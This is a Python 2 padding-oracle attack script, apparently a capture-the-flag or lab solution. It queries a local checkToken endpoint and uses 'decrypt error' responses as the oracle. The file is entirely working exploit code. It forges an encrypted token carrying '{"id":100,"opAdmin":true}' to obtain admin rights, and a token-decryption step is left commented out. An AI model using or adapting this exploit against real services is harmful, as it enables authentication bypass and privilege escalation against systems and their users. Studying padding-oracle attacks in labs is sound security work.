# -*- coding: utf-8 -*-
from paddingoracle import BadPaddingException, PaddingOracle
from base64 import b64encode, b64decode
from urllib import quote, unquote
import requests
import socket
import time


class PadBuster(PaddingOracle):
    def __init__(self, **kwargs):
        super(PadBuster, self).__init__(**kwargs)
        self.session = requests.Session()
        self.wait = kwargs.get('wait', 2.0)

    def oracle(self, data, **kwargs):
        token = quote(b64encode(data))

        while 1:
            try:
                response = self.session.get('http://127.0.0.1:8080/checkToken?token=' + token,
                                            stream=False, timeout=5, verify=False)
                break
            except (socket.error, requests.exceptions.RequestException):
                logging.exception('Retrying request in %.2f seconds...',
                                  self.wait)
                time.sleep(self.wait)
                continue

        self.history.append(response)

        if "decrypt error" not in response.text:
            logging.debug('No padding exception raised on %r', token)
            return

        raise BadPaddingException


if __name__ == '__main__':
    import logging

    logging.basicConfig(level=logging.DEBUG)

    token = "SnVzdERvSXQ6aXYvY2Jjfjhtbz4drcgEqHMHLK+gDcH9fJe4YJIIzmZKIh+nbqOR"
    encrypted_token = b64decode(token)

    padbuster = PadBuster()

    '''
    plaintext_padding = padbuster.decrypt(encrypted_token, block_size=16, iv=bytearray(16))
    print('Decrypted some token: %s => %r' % (token, plaintext_padding))
    '''
    admin_plaintext_padding = '{"id":100,"opAdmin":true}'
    encrypted_padding = padbuster.encrypt(admin_plaintext_padding, block_size=16, iv=bytearray(16))
    print quote(b64encode(encrypted_padding))
